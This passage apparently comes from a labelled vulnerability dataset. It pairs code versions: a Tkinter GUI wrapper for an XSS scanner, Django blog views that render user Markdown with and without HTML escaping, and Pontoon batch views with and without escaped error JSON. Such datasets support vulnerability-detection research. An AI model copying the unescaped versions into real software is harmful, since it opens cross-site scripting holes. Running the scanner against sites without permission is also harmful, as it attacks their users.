pady=4)\nLabel(main, text = \"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1)\nmainloop()\n/n/n/n", "label": 0}, {"id": "7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1", "code": "/xss.py/n/nimport sys,threading,time\nfrom datetime import datetime\ntry:\n from tkinter import *\n from tkinter import ttk\nexcept:\n print(\"You need to install: tkinter\")\n sys.exit()\ntry:\n import bane\nexcept:\n print(\"You need to install: bane\")\n sys.exit()\n\nclass sc(threading.Thread):\n def run(self):\n  global stop\n  ti=time.time()\n  print(\"=\"*25)\n  print(\"\\n[*]Target: {}\\n[*]Date: {}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\")))\n  crl=[target.get()]\n  if crawl.get()=='On':\n   crl+=bane.crawl(target.get(),bypass=True)\n  pr=proxy.get()\n  if len(pr)==0:\n   pr=None\n  if method.get()==\"GET\":\n   get=True\n   post=False\n  elif method.get()==\"POST\":\n   get=False\n   post=True\n  else:\n   get=True\n   post=True\n  fresh=False\n  if refresh.get()==\"On\":\n   fresh=True\n  ck=None\n  c=cookie.get()\n  if len(c)>0:\n   ck=c\n  for x in crl:\n   if stop==True:\n    break\n   print(\"[*]URL: {}\".format(x))\n   bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck)\n  print(\"[*]Test was finished at: {}\\n[*]Duration: {} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti)))\n  print(\"=\"*25)\n\nstop=False\n\ndef scan():\n sc().start()\n\nclass ki(threading.Thread):\n def run(self):\n  global stop\n  stop=True\n\ndef kill():\n ki().start()\n\nmain = Tk()\nmain.title(\"XSS Sonar\")\nmain.configure(background='light sky blue')\nLabel(main, text = \"Target:\",background='light sky blue').grid(row=0)\nLabel(main, text = \"Cookie: (Optional)\",background='light sky blue').grid(row=1)\nLabel(main, text = \"Method:\",background='light sky blue').grid(row=2)\nLabel(main, text = \"Timeout:\",background='light sky blue').grid(row=3)\nLabel(main, text = \"User-Agent:\",background='light sky blue').grid(row=4)\nLabel(main, text = \"Payload:\",background='light sky blue').grid(row=5)\nLabel(main, text = \"HTTP Proxy:\",background='light sky blue').grid(row=6)\nLabel(main, text = \"Refresh:\",background='light sky blue').grid(row=7)\nLabel(main, text = \"Crawl\",background='light sky blue').grid(row=8)\nLabel(main, text = \"\",background='light sky blue').grid(row=9)\nLabel(main, text = \"\",background='light sky blue').grid(row=10)\n\nua=[\"\"]\nua+=bane.ua\nli=bane.read_file('xss.txt')\npl=[]\nfor x in li:\n pl.append(x.strip())\nprox=[\"\"]\nprox+=bane.http(200)\nglobal target\ntarget = Entry(main)\ntarget.insert(0,'http://')\nglobal cookie\ncookie=Entry(main)\nglobal method\nmethod= ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"])\nglobal timeout\ntimeout=ttk.Combobox(main, values=range(1,61))\ntimeout.current(14)\nglobal user_agent\nuser_agent=ttk.Combobox(main, values=ua)\nuser_agent.current(1)\nglobal payload\npayload = ttk.Combobox(main, values=pl)\npayload.current(0)\nglobal proxy\nproxy=ttk.Combobox(main, values=prox)\nglobal refresh\nrefresh=ttk.Combobox(main, values=[\"On\", \"Off\"])\nglobal crawl\ncrawl=ttk.Combobox(main, values=[\"On\", \"Off\"])\n\ntarget.grid(row=0, column=1)\ntarget.config(width=30)\ncookie.grid(row=1, column=1)\ncookie.config(width=30)\nmethod.grid(row=2, column=1)\nmethod.current(0)\nmethod.config(width=30)\ntimeout.grid(row=3, column=1)\ntimeout.config(width=30)\nuser_agent.grid(row=4, column=1)\nuser_agent.config(width=30)\npayload.grid(row=5, column=1)\npayload.config(width=30)\nproxy.grid(row=6, column=1)\nproxy.current(0)\nproxy.config(width=30)\nrefresh.grid(row=7, column=1)\nrefresh.current(1)\nrefresh.config(width=30)\ncrawl.grid(row=8, column=1)\ncrawl.current(0)\ncrawl.config(width=30)\n\nButton(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4)\nButton(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4)\nButton(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4)\nLabel(main, text = \"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1)\nmainloop()\n/n/n/n", "label": 1}, {"id": "333dc34f5feada55d1f6ff1255949ca00dec0f9c", "code": "app/Index/forms.py/n/n/n/n/napp/Index/views.py/n/n# \u52a0\u5bc6\u7b97\u6cd5\u5305\nimport hashlib\n\nfrom django import forms\n\n# \u5bfc\u5165\u6743\u9650\u63a7\u5236\u7c7b\nfrom django.contrib.auth import authenticate, login, logout\nfrom django.contrib.auth.forms import UserCreationForm, PasswordChangeForm\nfrom django.contrib.auth.models import User\nfrom django.contrib.auth.decorators import login_required\nfrom django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin\n\n# \u5bfc\u5165\u5206\u9875\u63d2\u4ef6\u5305\nfrom django.core.paginator import EmptyPage, PageNotAnInteger, Paginator\nfrom django.http import HttpResponse\nfrom django.urls import reverse\n\n# \u5bfc\u5165\u8bf7\u6c42\u4e0a\u4e0b\u6587\u6a21\u7248\nfrom django.template import RequestContext\n\n# \u5bfc\u5165\u5feb\u6377\u51fd\u6570\nfrom django.shortcuts import Http404, redirect, render, render_to_response\n\n# \u5bfc\u5165\u6a21\u578b\u89c6\u56fe\nfrom django.views.generic import ListView, DetailView\nfrom django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin\n\n# \u5bfc\u5165Markdown\u6e32\u67d3\u63d2\u4ef6\nfrom markdown import markdown\nfrom markdown.extensions import Extension\n\n# \u5bfc\u5165\u6a21\u578b\nfrom .models import Article, Category, Comment\n\n\nclass EscapeHtml(Extension):\n    def extendMarkdown(self, md):\n        md.preprocessors.deregister('html_block')\n        md.inlinePatterns.deregister('html')\n\n\ndef safe_md(string):\n    return markdown(string,\n                    extensions=[\n                        'markdown.extensions.extra',\n                        'markdown.extensions.codehilite',\n                        'markdown.extensions.toc',\n                        EscapeHtml()\n                    ], safe_mode=True)\n\n\nclass ArticleForm(forms.ModelForm):\n    class Meta:\n        model = Article\n        fields = ['title', 'category', 'content']\n\n\nclass CommentForm(forms.ModelForm):\n    class Meta:\n        model = Comment\n        fields = ['content']\n\n\nclass UserDetail(DetailView):\n    model = User\n    template_name = 'user.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['articles'] = self.object.article_set.all()\n        context['form'] = CommentForm()\n        return context\n\n\nclass RegisterFormView(FormView):\n    \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\"\n    template_name = 'register.html'\n    form_class = UserCreationForm\n    success_url = '/login/'\n\n    def form_valid(self, form):\n        \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\"\n        form.save()\n        return super().form_valid(form)\n\n\nclass ArticlesList(ListView):\n    \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\"\n    model = Article\n    context_object_name = 'articles'\n    template_name = 'index.html'\n    paginate_by = 5\n\n    def get_queryset(self, **kwargs):\n        queryset = Article.objects.order_by('-time')\n        for i in queryset:\n            i.md = safe_md(i.content)\n\n        return queryset\n\n\nclass ArticleDetail(DetailView, FormMixin):\n    \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002\n    \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a\n    FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002\n    \"\"\"\n    model = Article\n    # model.content = markdown(model.content)\n    context_object_name = 'article'\n    template_name = 'details.html'\n    form_class = CommentForm\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.pk})\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['comments'] = self.object.comment_set.all().order_by('-time')\n        context['form'] = self.get_form()\n        context['md'] = safe_md(self.object.content)\n\n        return context\n\n    def post(self, request, *args, **kwargs):\n        self.object = self.get_object()\n        form = self.get_form()\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.form_invalid(form)\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.article = self.object\n        a.save()\n        return super().form_valid(form)\n\n\ndef is_mobile(useragent):\n    devices = [\"Android\", \"iPhone\", \"SymbianOS\",\n               \"Windows Phone\", \"iPad\", \"iPod\"]\n\n    for d in devices:\n        if d in useragent:\n            return True\n\n    return False\n\n\nclass ArticleFormView(LoginRequiredMixin, FormView):\n    \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\"\n\n    model = Article\n    template_name = 'post.html'\n    context_object_name = 'articles'\n    form_class = ArticleForm\n    success_url = '/'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.save()\n        return super().form_valid(form)\n\n\nclass ArticleUpdateView(UserPassesTestMixin, UpdateView):\n    \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\"\n    model = Article\n    success_url = '/'\n    fields = ['content', 'category']\n    template_name = 'update.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass ArticleDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\"\n    model = Article\n    success_url = '/'\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass CommentDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\"\n    model = Comment\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.article.pk})\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n/n/n/n", "label": 0}, {"id": "333dc34f5feada55d1f6ff1255949ca00dec0f9c", "code": "/app/Index/views.py/n/n# \u52a0\u5bc6\u7b97\u6cd5\u5305\nimport hashlib\n\nfrom django import forms\n\n# \u5bfc\u5165\u6743\u9650\u63a7\u5236\u7c7b\nfrom django.contrib.auth import authenticate, login, logout\nfrom django.contrib.auth.forms import UserCreationForm, PasswordChangeForm\nfrom django.contrib.auth.models import User\nfrom django.contrib.auth.decorators import login_required\nfrom django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin\n\n# \u5bfc\u5165\u5206\u9875\u63d2\u4ef6\u5305\nfrom django.core.paginator import EmptyPage, PageNotAnInteger, Paginator\nfrom django.http import HttpResponse\nfrom django.urls import reverse\n\n# \u5bfc\u5165\u8bf7\u6c42\u4e0a\u4e0b\u6587\u6a21\u7248\nfrom django.template import RequestContext\n\n# \u5bfc\u5165\u5feb\u6377\u51fd\u6570\nfrom django.shortcuts import Http404, redirect, render, render_to_response\n\n# \u5bfc\u5165\u6a21\u578b\u89c6\u56fe\nfrom django.views.generic import ListView, DetailView\nfrom django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin\n\n# \u5bfc\u5165Markdown\u6e32\u67d3\u63d2\u4ef6\nfrom markdown import markdown\n\n# \u5bfc\u5165\u6a21\u578b\nfrom .models import Article, Category, Comment\n\n\nclass ArticleForm(forms.ModelForm):\n    class Meta:\n        model = Article\n        fields = ['title', 'category', 'content']\n\n\nclass CommentForm(forms.ModelForm):\n    class Meta:\n        model = Comment\n        fields = ['content']\n\n\nclass UserDetail(DetailView):\n    model = User\n    template_name = 'user.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['articles'] = self.object.article_set.all()\n        context['form'] = CommentForm()\n        return context\n\n\nclass RegisterFormView(FormView):\n    \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\"\n    template_name = 'register.html'\n    form_class = UserCreationForm\n    success_url = '/login/'\n\n    def form_valid(self, form):\n        \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\"\n        form.save()\n        return super().form_valid(form)\n\n\nclass ArticlesList(ListView):\n    \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\"\n    model = Article\n    context_object_name = 'articles'\n    template_name = 'index.html'\n    paginate_by = 5\n\n    def get_queryset(self, **kwargs):\n        queryset = Article.objects.order_by('-time')\n        for i in queryset:\n            i.md = markdown(i.content, extensions=[\n                'markdown.extensions.extra',\n                'markdown.extensions.codehilite',\n                'markdown.extensions.toc',\n            ])\n\n        return queryset\n\n\nclass ArticleDetail(DetailView, FormMixin):\n    \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002\n    \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a\n    FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002\n    \"\"\"\n    model = Article\n    # model.content = markdown(model.content)\n    context_object_name = 'article'\n    template_name = 'details.html'\n    form_class = CommentForm\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.pk})\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['comments'] = self.object.comment_set.all().order_by('-time')\n        context['form'] = self.get_form()\n        context['md'] = markdown(self.object.content,\n                                 extensions=[\n                                     'markdown.extensions.extra',\n                                     'markdown.extensions.codehilite',\n                                     'markdown.extensions.toc',\n                                 ])\n\n        return context\n\n    def post(self, request, *args, **kwargs):\n        self.object = self.get_object()\n        form = self.get_form()\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.form_invalid(form)\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.article = self.object\n        a.save()\n        return super().form_valid(form)\n\n\ndef is_mobile(useragent):\n    devices = [\"Android\", \"iPhone\", \"SymbianOS\",\n               \"Windows Phone\", \"iPad\", \"iPod\"]\n\n    for d in devices:\n        if d in useragent:\n            return True\n\n    return False\n\n\nclass ArticleFormView(LoginRequiredMixin, FormView):\n    \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\"\n\n    model = Article\n    template_name = 'post.html'\n    context_object_name = 'articles'\n    form_class = ArticleForm\n    success_url = '/'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.save()\n        return super().form_valid(form)\n\n\nclass ArticleUpdateView(UserPassesTestMixin, UpdateView):\n    \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\"\n    model = Article\n    success_url = '/'\n    fields = ['content', 'category']\n    template_name = 'update.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass ArticleDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\"\n    model = Article\n    success_url = '/'\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass CommentDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\"\n    model = Comment\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.article.pk})\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n/n/n/n", "label": 1}, {"id": "fc07ed9c68e08d41f74c078b4e7727f1a0888be8", "code": "pontoon/batch/views.py/n/nimport logging\n\nfrom bulk_update.helper import bulk_update\n\nfrom django.contrib.auth.decorators import login_required\nfrom django.db import transaction\nfrom django.http import (\n    HttpResponseBadRequest,\n    HttpResponseForbidden,\n    JsonResponse,\n)\nfrom django.shortcuts import get_object_or_404\nfrom django.views.decorators.http import (\n    require_POST\n)\n\nfrom pontoon.base.models import (\n    ChangedEntityLocale,\n    Entity,\n    Locale,\n    Project,\n    ProjectLocale,\n    TranslationMemoryEntry,\n    Translation,\n)\nfrom pontoon.base.utils import (\n    require_AJAX,\n    readonly_exists,\n)\nfrom pontoon.batch import forms\nfrom pontoon.batch.actions import ACTIONS_FN_MAP\n\n\nlog = logging.getLogger(__name__)\n\n\ndef update_stats(translated_resources, locale):\n    \"\"\"Update stats on a list of TranslatedResource.\n    \"\"\"\n    projects = set()\n    for translated_resource in translated_resources:\n        projects.add(translated_resource.resource.project)\n        translated_resource.calculate_stats(save=False)\n\n    bulk_update(translated_resources, update_fields=[\n        'total_strings',\n        'approved_strings',\n        'fuzzy_strings',\n        'strings_with_errors',\n        'strings_with_warnings',\n        'unreviewed_strings',\n    ])\n\n    locale.aggregate_stats()\n\n    for project in projects:\n        project.aggregate_stats()\n        ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()\n\n\ndef mark_changed_translation(changed_entities, locale):\n    \"\"\"Mark entities as changed, for later sync.\n    \"\"\"\n    changed_entities_array = []\n    existing = (\n        ChangedEntityLocale.objects\n        .values_list('entity', 'locale')\n        .distinct()\n    )\n    for changed_entity in changed_entities:\n        key = (changed_entity.pk, locale.pk)\n\n        # Remove duplicate changes to prevent unique constraint violation.\n        if key not in existing:\n            changed_entities_array.append(\n                ChangedEntityLocale(entity=changed_entity, locale=locale)\n            )\n\n    ChangedEntityLocale.objects.bulk_create(changed_entities_array)\n\n\ndef update_translation_memory(changed_translation_pks, project, locale):\n    \"\"\"Update translation memory for a list of translations.\n    \"\"\"\n    memory_entries = [\n        TranslationMemoryEntry(\n            source=t.entity.string,\n            target=t.string,\n            locale=locale,\n            entity=t.entity,\n            translation=t,\n            project=project,\n        ) for t in (\n            Translation.objects\n            .filter(pk__in=changed_translation_pks)\n            .prefetch_related('entity__resource')\n        )\n    ]\n    TranslationMemoryEntry.objects.bulk_create(memory_entries)\n\n\n@login_required(redirect_field_name='', login_url='/403')\n@require_POST\n@require_AJAX\n@transaction.atomic\ndef batch_edit_translations(request):\n    \"\"\"Perform an action on a list of translations.\n\n    Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view\n    are defined in `models.BatchActionsForm`.\n\n    \"\"\"\n    form = forms.BatchActionsForm(request.POST)\n    if not form.is_valid():\n        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))\n\n    locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n    entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n\n    if not entities.exists():\n        return JsonResponse({'count': 0})\n\n    # Batch editing is only available to translators. Check if user has\n    # translate permissions for all of the projects in passed entities.\n    # Also make sure projects are not enabled in read-only mode for a locale.\n    projects_pk = entities.values_list('resource__project__pk', flat=True)\n    projects = Project.objects.filter(pk__in=projects_pk.distinct())\n\n    for project in projects:\n        if (\n            not request.user.can_translate(project=project, locale=locale)\n            or readonly_exists(projects, locale)\n        ):\n            return HttpResponseForbidden(\n                \"Forbidden: You don't have permission for batch editing\"\n            )\n\n    # Find all impacted active translations, including plural forms.\n    active_translations = Translation.objects.filter(\n        active=True,\n        locale=locale,\n        entity__in=entities,\n    )\n\n    # Execute the actual action.\n    action_function = ACTIONS_FN_MAP[form.cleaned_data['action']]\n    action_status = action_function(\n        form,\n        request.user,\n        active_translations,\n        locale,\n    )\n\n    if action_status.get('error'):\n        return JsonResponse(action_status)\n\n    invalid_translation_count = len(action_status.get('invalid_translation_pks', []))\n    if action_status['count'] == 0:\n        return JsonResponse({\n            'count': 0,\n            'invalid_translation_count': invalid_translation_count,\n        })\n\n    update_stats(action_status['translated_resources'], locale)\n    mark_changed_translation(action_status['changed_entities'], locale)\n\n    # Update latest translation.\n    if action_status['latest_translation_pk']:\n        Translation.objects.get(\n            pk=action_status['latest_translation_pk']\n        ).update_latest_translation()\n\n    update_translation_memory(\n        action_status['changed_translation_pks'],\n        project,\n        locale\n    )\n\n    return JsonResponse({\n        'count': action_status['count'],\n        'invalid_translation_count': invalid_translation_count,\n    })\n/n/n/n", "label": 0}, {"id": "fc07ed9c68e08d41f74c078b4e7727f1a0888be8", "code": "/pontoon/batch/views.py/n/nimport logging\n\nfrom bulk_update.helper import bulk_update\n\nfrom django.contrib.auth.decorators import login_required\nfrom django.db import transaction\nfrom django.http import (\n    HttpResponseBadRequest,\n    HttpResponseForbidden,\n    JsonResponse,\n)\nfrom django.shortcuts import get_object_or_404\nfrom django.views.decorators.http import (\n    require_POST\n)\n\nfrom pontoon.base.models import (\n    ChangedEntityLocale,\n    Entity,\n    Locale,\n    Project,\n    ProjectLocale,\n    TranslationMemoryEntry,\n    Translation,\n)\nfrom pontoon.base.utils import (\n    require_AJAX,\n    readonly_exists,\n)\nfrom pontoon.batch import forms\nfrom pontoon.batch.actions import ACTIONS_FN_MAP\n\n\nlog = logging.getLogger(__name__)\n\n\ndef update_stats(translated_resources, locale):\n    \"\"\"Update stats on a list of TranslatedResource.\n    \"\"\"\n    projects = set()\n    for translated_resource in translated_resources:\n        projects.add(translated_resource.resource.project)\n        translated_resource.calculate_stats(save=False)\n\n    bulk_update(translated_resources, update_fields=[\n        'total_strings',\n        'approved_strings',\n        'fuzzy_strings',\n        'strings_with_errors',\n        'strings_with_warnings',\n        'unreviewed_strings',\n    ])\n\n    locale.aggregate_stats()\n\n    for project in projects:\n        project.aggregate_stats()\n        ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()\n\n\ndef mark_changed_translation(changed_entities, locale):\n    \"\"\"Mark entities as changed, for later sync.\n    \"\"\"\n    changed_entities_array = []\n    existing = (\n        ChangedEntityLocale.objects\n        .values_list('entity', 'locale')\n        .distinct()\n    )\n    for changed_entity in changed_entities:\n        key = (changed_entity.pk, locale.pk)\n\n        # Remove duplicate changes to prevent unique constraint violation.\n        if key not in existing:\n            changed_entities_array.append(\n                ChangedEntityLocale(entity=changed_entity, locale=locale)\n            )\n\n    ChangedEntityLocale.objects.bulk_create(changed_entities_array)\n\n\ndef update_translation_memory(changed_translation_pks, project, locale):\n    \"\"\"Update translation memory for a list of translations.\n    \"\"\"\n    memory_entries = [\n        TranslationMemoryEntry(\n            source=t.entity.string,\n            target=t.string,\n            locale=locale,\n            entity=t.entity,\n            translation=t,\n            project=project,\n        ) for t in (\n            Translation.objects\n            .filter(pk__in=changed_translation_pks)\n            .prefetch_related('entity__resource')\n        )\n    ]\n    TranslationMemoryEntry.objects.bulk_create(memory_entries)\n\n\n@login_required(redirect_field_name='', login_url='/403')\n@require_POST\n@require_AJAX\n@transaction.atomic\ndef batch_edit_translations(request):\n    \"\"\"Perform an action on a list of translations.\n\n    Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view\n    are defined in `models.BatchActionsForm`.\n\n    \"\"\"\n    form = forms.BatchActionsForm(request.POST)\n    if not form.is_valid():\n        return HttpResponseBadRequest(form.errors.as_json())\n\n    locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n    entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n\n    if not entities.exists():\n        return JsonResponse({'count': 0})\n\n    # Batch editing is only available to translators. Check if user has\n    # translate permissions for all of the projects in passed entities.\n    # Also make sure projects are not enabled in read-only mode for a locale.\n    projects_pk = entities.values_list('resource__project__pk', flat=True)\n    projects = Project.objects.filter(pk__in=projects_pk.distinct())\n\n    for project in projects:\n        if (\n            not request.user.can_translate(project=project, locale=locale)\n            or readonly_exists(projects, locale)\n        ):\n            return HttpResponseForbidden(\n                \"Forbidden: You don't have permission for batch editing\"\n            )\n\n    # Find all impacted active translations, including plural forms.\n    active_translations = Translation.objects.filter(\n        active=True,\n        locale=locale,\n        entity__in=entities,\n    )\n\n    # Execute the actual action.\n    action_function = ACTIONS_FN_MAP[form.cleaned_data['action']]\n    action_status = action_function(\n        form,\n        request.user,\n        active_translations,\n        locale,\n    )\n\n    if action_status.get('error'):\n        return JsonResponse(action_status)\n\n    invalid_translation_count = len(action_status.get('invalid_translation_pks', []))\n    if action_status['count'] == 0:\n        return JsonResponse({\n            'count': 0,\n            'invalid_translation_count': invalid_translation_count,\n        })\n\n    update_stats(action_status['translated_resources'], locale)\n    mark_changed_translation(action_status['changed_entities'], locale)\n\n    # Update latest translation.\n    if action_status['latest_translation_pk']:\n        Translation.objects.get(\n            pk=action_status['latest_translation_pk']\n        ).update_latest_translation()\n\n    update_translation_memory(\n        action_status['changed_translation_pks'],\n        project,\n        locale\n    )\n\n    return JsonResponse({\n        'count': action_status['count'],\n        'invalid_translation_count': invalid_translation_count,\n    })\n/n/n/n", "label": 1}]